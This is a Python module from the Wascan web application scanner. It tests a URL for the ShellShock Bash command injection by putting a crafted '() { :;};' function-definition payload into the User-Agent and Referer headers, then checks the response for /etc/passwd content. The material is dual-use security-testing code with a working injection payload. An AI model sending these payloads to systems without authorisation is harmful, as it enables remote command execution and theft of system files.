#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#
# @name:    Wascan - Web Application Scanner
# @repo:    https://github.com/m4ll0k/Wascan
# @author:  Momo Outaadi (M4ll0k)
# @license: See the file 'LICENSE.txt'

from re import search,I 
from lib.utils.printer import *
from lib.request.request import *
from lib.utils.payload import bash

class bashi(Request):
	"""Bash Command Injection (ShellShock)"""
	get = "GET"
	def __init__(self,kwargs,url,data):
		Request.__init__(self,kwargs)
		self.url = url
		self.data = data

	def run(self):
		"""Run"""
		info('Checking Bash Command Injection...')
		for payload in bash():
			# user-agent and referer header add the payload
			user_agent = {'User-Agent':'() { :;}; echo; echo; %s;'%payload,
						  'Referer':'() { :;}; echo; echo; %s;'%payload
						  }
			# send request
			req = self.Send(url=self.url,method=self.get,headers=user_agent)
			# split payload
			if '\"' in payload: payload = payload.split('"')[1]
			# search root:/bin/ba[sh] or payload in content 
			if search(r"root:/bin/[bash|sh]|"+payload,req.content):
				plus("A potential \"Bash Command Injection\" was found via HTTP User-Agent header (ShellShock)")
				more("URL: {}".format(self.url))
				more("PAYLOAD: {}".format('() { :;}; echo; echo; %s;'%(payload)))
				break
